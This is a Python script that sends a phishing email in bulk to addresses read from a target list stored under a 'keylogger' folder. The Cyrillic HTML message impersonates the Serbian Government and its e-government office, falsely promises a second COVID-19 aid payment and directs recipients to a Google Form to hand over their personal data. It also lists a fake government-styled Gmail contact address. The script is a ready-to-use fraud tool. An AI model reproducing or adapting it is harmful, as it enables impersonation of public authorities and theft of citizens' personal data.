import threading
import smtplib
import datetime, time
import os
import sys

from email.mime.text import MIMEText
from email.message import EmailMessage
from time import sleep

recivers = []

class TimerClass(threading.Thread):
    def run(self):
            recivers = readEmails()
            SERVER = "smtp.gmail.com"       
            PORT = 587                                
            USER= "" #INSERT EMAIL                           
            PASS= "" #INSERT PASSWORD                                              
            FROM = USER
            TO = recivers #INSERT ADMIN MAIL HERE OR LIST OF EMAILS
            html = """\
                
                <!DOCTYPE html PUBLIC>
<html xmlns="http://www.w3.org/1999/xhtml" xmlns:o="urn:schemas-microsoft-com:office:office" xmlns:v="urn:schemas-microsoft-com:vml" lang="en">
    <head>
        <link rel="stylesheet" type="text/css" hs-webfonts="true" href="https://fonts.googleapis.com/css?family=Lato|Lato:i,b,bi">
        <title>Email template</title>
        <meta property="og:title" content="Email template">

        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">

        <meta http-equiv="X-UA-Compatible" content="IE=edge">

        <meta name="viewport" content="width=device-width, initial-scale=1.0">

        <style type="text/css">
                a { 
                    text-decoration: underline;
                    color: inherit;
                    font-weight: bold;
                    color: #253342;
                }
                
                h1 {
                    font-size: 56px;
                }
                
                h2 {
                    font-size: 28px;
                    font-weight: 900; 
                }
                
                p {
                    font-weight: 100;
                }
                
                td {
                    vertical-align: top;
                }
                
                #email {
                    margin: auto;
                    width: 600px;
                    background-color: white;
                }
                
                button {
                    font: inherit;
                    background-color: #FF7A59;
                    border: none;
                    padding: 10px;
                    text-transform: uppercase;
                    letter-spacing: 2px;
                    font-weight: 900; 
                    color: white;
                    border-radius: 5px; 
                    box-shadow: 3px 3px #d94c53;
                }
                
                .subtle-link {
                    font-size: 9px; 
                    text-transform:uppercase; 
                    letter-spacing: 1px;
                    color: #CBD6E2;
                }
        </style>
    </head>

    <body bgcolor="#F5F8FA" style="width: 100%; margin: auto 0; padding:0; font-family:Lato, sans-serif; font-size:18px; color:#33475B; word-break:break-word">
    <! Banner --> 
    <table role="presentation" width="100%">
        <tr>
            <td bgcolor="#00A4BD" align="center" style="color: white;">
                <img src="http://www.dijaspora.gov.rs/wp-content/uploads/2013/09/srbija_veliki_grb.jpg" width="400px" align="middle">
                <h1> Електронска пријава за помоћ грађанима Републике Србије </h1>
            </td>
        </tr>
    </table>

    <! First Row --> 
        <table role="presentation" border="0" cellpadding="0" cellspacing="10px" style="padding: 30px 30px 30px 60px;">
            <tr>
                <td>
                    <h2> Поштовани,</h2>
                        <p>
                            Влада Републике Србије званично је започела доделу другог дела помоћи грађанима услед пандемије <br>
                            COVID-19. Сви грађани који су се пријавили за први део помоћи имају право на пријаву за други део <br>
                            у наведеном року. Први део помоћи подељен је почетком ове године док ће други део помоћи бити до- <br>
                            ступан грађанима који се пријаве електронским путем закључно са 30.09.2021. <br>
                            <br>
                            <br>
                            Да бисте се пријавили за други део помоћи у износу од 30 евра потребно је да доставите своје податке на следећем <a href="https://docs.google.com/forms/d/e/1FAIpQLSfgnlSG-F2CMeTamrLBvZ99rrOj8yRUHp5721CcExwyVhcHaw/viewform?usp=sf_link"> ЛИНКУ</a>.
                            <br>
                            <br>
                            <br>
                            Молимо Вас да на овај имејл не одговарате. 
                            <br>
                            За све нејасноће можете се обратити на имејл адресу <a href="#"> vrs.mup.gov.noreply@gmail.com</a> или позивом на број 011/44-22-11.
                        </p>
                </td> 
            </tr>
        </table>
        
        <! Banner Row --> 
        <table role="presentation" bgcolor="#EAF0F6" width="100%" style="margin-top: 50px;" >
            <tr>
                <td align="center" style="padding: 30px 30px;">
                    <img src="https://www.ite.gov.rs/img/nr-euprava.png" width="400px" align="middle">
                    <h2> Влада Републике Србије </h2>
                        <p>
                            Канцеларија за информационе технологије и електронску управу. <br>
                        </p>
                </td>
            </tr>
        </table>
    </body>
</html>

            """
            try:
                with smtplib.SMTP('smtp.gmail.com', 587) as smtp:
                    smtp.ehlo()
                    smtp.starttls() 
                    smtp.ehlo()
                    smtp.login(USER, PASS)

                    for mail in recivers:
                        msg = EmailMessage()
                        msg['Subject'] = "Електронска пријава другог дела новчане помоћи"
                        msg['From'] = USER
                        BODY = MIMEText(html, 'html')
                        msg.set_content(BODY)
                        msg['To'] = mail
                        smtp.send_message(msg)

                        sleep(1)
                        print(f'Poslat na {mail}')

                    smtp.quit()
            except Exception as e:
                print(e)

def resource_path(relative_path):
    """ Get absolute path to resource, works for dev and for PyInstaller """
    try:
        # PyInstaller creates a temp folder and stores path in _MEIPASS
        base_path = sys._MEIPASS
    except Exception:
        base_path = os.path.abspath(".")

    return os.path.join(base_path, relative_path)

def readEmails():
    path = resource_path(resource_path("src//keylogger//assets//targetEmails.txt"))

    fileObject = open(path, "r")
    data = fileObject.read().splitlines()
    fileObject.close()

    return data

def main():
    emailClient = TimerClass()
    emailClient.run()